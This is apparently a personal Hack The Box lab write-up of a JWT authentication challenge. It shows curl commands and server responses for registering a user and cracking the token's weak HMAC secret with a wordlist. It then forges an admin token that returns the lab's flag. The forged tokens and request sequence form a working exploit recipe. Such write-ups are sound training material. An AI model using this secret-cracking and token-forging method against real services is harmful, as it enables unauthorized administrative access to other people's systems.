**HTB LAB Assestment(Authentication)**
We are provided only a VHOST as entry point but no other information making it as a Blackbox approach!

1)Starting by surfing manually on the index we are presented with 2 possible functions that could be used by the backend(Login/Register)
```
┌──(root㉿kali)-[/home/millycash/Downloads/Certs]
└─# curl http://asmt.htb.net/                                            
```
A token is required for authentication. Use **/login** to get a token or **/register** to create a new user.

2)Since we got no credentials by the client i guess we need to register a new user, perform a login and then we will get a new token. So let's start by registering our dummy user:
```
┌──(root㉿kali)-[/home/millycash/Downloads/Certs]
└─# curl http://asmt.htb.net/register
{"success":"false","message":"Method not allowed","error":{"statusCode":405,"message":"You may not use a GET request to register"}} 
```
OK we need to test via POST instead and seems like content-type JSON as well?
```
┌──(root㉿kali)-[/home/millycash/Downloads/Certs]
└─# curl -X POST http://asmt.htb.net/register
Content-Type must be application/json                                                                          
```
Sending a void request tells us how eventually the request body should look like:
```
┌──(root㉿kali)-[/home/millycash/Downloads/Certs]
└─# curl -X POST -H "Content-Type: application/json"  http://asmt.htb.net/register -d '{"test":"test"}'
You must send: first_name, last_name, email, password   
```
And now we can add our user:
```
┌──(root㉿kali)-[/home/millycash/Downloads/Certs]
└─# curl -X POST -H "Content-Type: application/json"  http://asmt.htb.net/register -d '{"first_name":"Bello","last_name":"Figo","email":"yovecio@test.htb","password":"Coglione1!"}'
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjVjYTU1ODI1NGU0NzdhYmZjMzVhMjBiIiwiZW1haWwiOiJ5b3ZlY2lvQHRlc3QuaHRiIiwiZmlyc3RfbmFtZSI6IkJlbGxvIiwibGFzdF9uYW1lIjoiRmlnbyIsImlzQWRtaW4iOmZhbHNlLCJpYXQiOjE3MDc3NTg5NzgsImV4cCI6MTcwNzc2NjE3OH0.YU7svcWNCgENh6cyOfVursRn3bRd9DsPQzNmgdd9prM"}        
```

3)Judging by the token structure this is definitely a JWT token so let's check it under jwt.io
```
{
  "user_id": "65ca558254e477abfc35a20b",
  "email": "yovecio@test.htb",
  "first_name": "Bello",
  "last_name": "Figo",
  "isAdmin": false,
  "iat": 1707758978,
  "exp": 1707766178
}
```

4)If we want to forge our token we need to see if we can do  by(crack weak key,none alg attack or lastly missing signature check). So here I tried to crack the token and found the secret:
```
──(root㉿kali)-[/home/millycash/Downloads/Certs]
└─# gojwtcrack -d /usr/share/wordlists/rockyou.txt -t token.txt 
london	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjVjYTU1ODI1NGU0NzdhYmZjMzVhMjBiIiwiZW1haWwiOiJ5b3ZlY2lvQHRlc3QuaHRiIiwiZmlyc3RfbmFtZSI6IkJlbGxvIiwibGFzdF9uYW1lIjoiRmlnbyIsImlzQWRtaW4iOmZhbHNlLCJpYXQiOjE3MDc3NTg5NzgsImV4cCI6MTcwNzc2NjE3OH0.YU7svcWNCgENh6cyOfVursRn3bRd9DsPQzNmgdd9prM
```
So I will create 2 different tokens that have tampered the **"isAdmin": true:**
**-(Secretkey)**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjVjYTU1ODI1NGU0NzdhYmZjMzVhMjBiIiwiZW1haWwiOiJ5b3ZlY2lvQHRlc3QuaHRiIiwiZmlyc3RfbmFtZSI6IkJlbGxvIiwibGFzdF9uYW1lIjoiRmlnbyIsImlzQWRtaW4iOnRydWUsImlhdCI6MTcwNzc1ODk3OCwiZXhwIjoxNzA3NzY2MTc4fQ.1HPBSr-4r2ibeNAOWHIt3xGR6xIJB149bLmNJHC3CK4


NoSecretkey)eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjVjYTU1ODI1NGU0NzdhYmZjMzVhMjBiIiwiZW1haWwiOiJ5b3ZlY2lvQHRlc3QuaHRiIiwiZmlyc3RfbmFtZSI6IkJlbGxvIiwibGFzdF9uYW1lIjoiRmlnbyIsImlzQWRtaW4iOnRydWUsImlhdCI6MTcwNzc1ODk3OCwiZXhwIjoxNzA3NzY2MTc4fQ.5y-_0vt1DhnD5Ij2jTbAC-AZ4cUE_NlRhd80MG6NGgE
```

5)The only difference here is if Signature check is in place then the second one might not work, if so then we can use the first one!
So now we need to test that /login function and up  on a same procedure seems like we need to use a POST request in JSON format:
```
┌──(root㉿kali)-[/home/millycash/Downloads/Certs]
└─# curl -X POST -H "Content-Type: application/json"  http://asmt.htb.net/login -d '{"test":"test"}'
You must send: email, password   
```
And using these informations we can get another token:
```
┌──(root㉿kali)-[/home/millycash/Downloads/Certs]
└─# curl -X POST -H "Content-Type: application/json"  http://asmt.htb.net/login -d '{"email":"yovecio@test.htb",
"password":"Coglione1!"}'
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjVjYTU1ODI1NGU0NzdhYmZjMzVhMjBiIiwiZW1haWwiOiJ5b3ZlY2lvQHRlc3QuaHRiIiwiZmlyc3RfbmFtZSI6IkJlbGxvIiwibGFzdF9uYW1lIjoiRmlnbyIsImlzQWRtaW4iOmZhbHNlLCJpYXQiOjE3MDc3NTk5NDIsImV4cCI6MTcwNzc2NzE0Mn0.7l3B72hV1koBUaIaGUl7r-XQp7SMQT_Y18QL7nKkCYM"}   
```

6)Now we need to find a page that ask for JWT token validation, and so far both **/login** & **/register** ask everything except a token so it must be another page. If we try to surf on the root **/** then we get the validation?
```
┌──(root㉿kali)-[/home/millycash/Downloads]
└─# curl http://asmt.htb.net/             
A token is required for authentication. Use /login to get a token or /register to create a new user.
So even if we use the cookie we get from /login into Headers(Cookie: token:XXXXXX) it isn't working.
```
But if we keep the same methodology and use the application/json as content-type we are getting another response:
```
┌──(root㉿kali)-[/home/millycash/Downloads]
└─# curl -i -s -k -X $'GET' \
    -H $'Content-Type: application/json' -H $'Connection: close' -H $'Content-Length: 306' \      
    --data-binary $'{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjVjYTU1ODI1NGU0NzdhYmZjMzVhMjBiIiwiZW1haWwiOiJ5b3ZlY2lvQHRlc3QuaHRiIiwiZmlyc3RfbmFtZSI6IkJlbGxvIiwibGFzdF9uYW1lIjoiRmlnbyIsImlzQWRtaW4iOmZhbHNlLCJpYXQiOjE3MDc3NjEyODAsImV4cCI6MTcwNzc2ODQ4MH0.M0wLH-fM3Un14R7xqQRGFOf4eIJ5ljWxXQ4NGf7oEg8\"}\x0d\x0a\x0d\x0a\x0d\x0a' \
    $'http://asmt.htb.net/'
HTTP/1.1 200 OK
Server: nginx/1.21.6
Date: Mon, 12 Feb 2024 18:10:35 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 294
Connection: close
X-Powered-By: Express
ETag: W/"126-rG4yU+VkG+szgD+w4E1b8t449cI"

{"success":"true","message":"Authentication successful. You may use this token across all endpoints with normal user access.","user_data":{"user_id":"65ca558254e477abfc35a20b","email":"yovecio@test.htb","first_name":"Bello","last_name":"Figo","isAdmin":false,"iat":1707761280,"exp":1707768480}}      
```

7)Now that we found out the trick we can start by trying to use the token without secret key validation but we get token invalid:
```
┌──(root㉿kali)-[/home/millycash/Downloads]
└─# curl -s -k -X $'GET' \ 
    -H $'Host: asmt.htb.net' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' -H $'Sec-GPC: 1' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'dnt: 1' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Content-Length: 305' \
    --data-binary $'{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjVjYTU1ODI1NGU0NzdhYmZjMzVhMjBiIiwiZW1haWwiOiJ5b3ZlY2lvQHRlc3QuaHRiIiwiZmlyc3RfbmFtZSI6IkJlbGxvIiwibGFzdF9uYW1lIjoiRmlnbyIsImlzQWRtaW4iOnRydWUsImlhdCI6MTcwNzc1ODk3OCwiZXhwIjoxNzA3NzY2MTc4fQ.5y-_0vt1DhnD5Ij2jTbAC-AZ4cUE_NlRhd80MG6NGgE\"}\x0d\x0a\x0d\x0a\x0d\x0a' \
    $'http://asmt.htb.net/'
Invalid Token
```
What if we use the one with the right signature instead? We got flag baby:
```
┌──(root㉿kali)-[/home/millycash/Downloads]
└─# curl \
    -H $'Host: asmt.htb.net' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' -H $'Sec-GPC: 1' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'dnt: 1' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Content-Length: 305' \
    --data-binary $'{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjVjYTU1ODI1NGU0NzdhYmZjMzVhMjBiIiwiZW1haWwiOiJ5b3ZlY2lvQHRlc3QuaHRiIiwiZmlyc3RfbmFtZSI6IkJlbGxvIiwibGFzdF9uYW1lIjoiRmlnbyIsImlzQWRtaW4iOnRydWUsImlhdCI6MTcwNzc1ODk3OCwiZXhwIjoxNzA3NzY2MTc4fQ.1HPBSr-4r2ibeNAOWHIt3xGR6xIJB149bLmNJHC3CK4\"}\x0d\x0a\x0d\x0a\x0d\x0a' \
    $'http://asmt.htb.net/'
{"success":"true","message":"Authentication successful. You may use this token across all endpoints with full admin access.","user_data":{"user_id":"65ca558254e477abfc35a20b","email":"yovecio@test.htb","first_name":"Bello","last_name":"Figo","isAdmin":true,"iat":1707758978,"exp":1707766178},"flag":"HTB{4u7#_6yp455_m4573r}"}
```
